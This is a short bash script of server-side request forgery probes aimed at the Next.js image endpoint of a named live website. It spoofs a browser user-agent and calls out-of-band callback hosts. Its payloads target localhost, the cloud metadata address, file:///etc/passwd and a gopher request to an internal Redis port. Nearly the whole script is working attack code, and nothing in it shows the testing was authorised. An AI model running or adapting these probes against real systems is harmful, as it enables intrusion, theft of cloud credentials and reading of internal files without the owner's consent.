#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
H1=ooba50a6dc7f80f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
H2=oob21d4e9c881b6.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in

p() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }

echo "--- 1 plain OOB host"
U=$(p "http://$H1/ssrf-p14")
curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download} type=%{content_type}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75"
sleep 3
echo "--- 2 dns rebind style / nip"
U=$(p "http://$H2/x.png")
curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download} type=%{content_type}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75"
echo "--- 3 localhost"
U=$(p "http://127.0.0.1:1/x.png")
curl -sk -w "\ncode=%{http_code} size=%{size_download}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75" | tail -3
echo "--- 4 metadata"
U=$(p "http://169.254.169.254/latest/meta-data/")
curl -sk -w "\ncode=%{http_code} size=%{size_download}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75" | tail -3
echo "--- 5 file proto"
U=$(p "file:///etc/passwd")
curl -sk -w "\ncode=%{http_code} size=%{size_download}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75" | tail -3
echo "--- 6 gopher"
U=$(p "gopher://127.0.0.1:6379/_PING")
curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75"
echo "--- 7 external legit"
U=$(p "https://example.com/x.png")
curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download} type=%{content_type}\n" -A "$UA" "$B/_next/image?url=$U&w=640&q=75"
echo "--- 8 ctfassets internal pattern check (400 msg)"
curl -sk -A "$UA" "$B/_next/image?url=&w=640&q=75"; echo